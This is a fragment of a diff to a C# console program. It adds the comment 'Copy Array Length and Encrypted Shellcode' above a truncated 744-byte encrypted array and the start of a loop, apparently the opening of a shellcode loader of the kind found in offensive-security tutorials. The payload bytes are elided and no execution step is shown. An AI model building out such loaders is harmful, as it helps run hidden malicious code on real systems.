@@ -24,6 +24,7 @@ namespace ConsoleApp1
 
         static void Main(string[] args)
         {
+            // Copy Array Length and Encrypted Shellcode
             byte[] buf = new byte[744] {0xfe, 0x4a, 0x85, 0xe6, 0xf2 ... };
 
             for (int i = 0; i < buf.Length; i++)
